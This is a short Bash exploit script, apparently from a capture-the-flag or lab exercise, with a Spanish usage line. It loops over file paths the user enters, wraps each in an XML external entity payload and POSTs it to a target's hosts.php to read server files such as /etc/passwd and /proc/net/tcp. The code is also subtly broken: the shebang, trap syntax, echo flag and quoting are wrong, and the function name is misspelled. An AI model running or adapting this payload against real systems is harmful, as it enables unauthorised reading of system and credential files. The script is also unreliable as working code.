``` bash

	#/bin/bash
	
	trap ctrl_c() INT
	
	declare -r url="http://10.10.10.78/hosts.php"
	
	function ctrl_c(){
		echo -c "\n\n[*] Exiting...\n"
		rm test.txt 2>/dev/null
		echo; exit 0
	}
	
	function cretateXMLFile(){
		echo "<?xml version="1.0" encoding='ISO-8859-1'>" > test.txt"
		echo "<!DOCTYPE foo [ <!ELEMENT foo ANY >" >> test.txt
		echo "<!ENTITY xxe SYSTEM 'file://$1' >]>" >> test.txt
		echo "<details>" >> test.txt
		echo "<subnet_mask>&xxe;</subnet_mask>" >> test.txt
		echo "<test></test>" >> test.txt
		echo "</details>" >> test.txt
	}
	
	function makeRequest(){
		echo; curl -s -d @test.txt $url; echo
	}
	
	while true; do
		echo -n "~$: " && read filename
		createXMLFile $filename
		makeRequest
	done
```

Uso:
`./xxe.sh /etc/passwd` 		// /etc/hosts, /proc/net/tcp, /proc/net/fib_trie

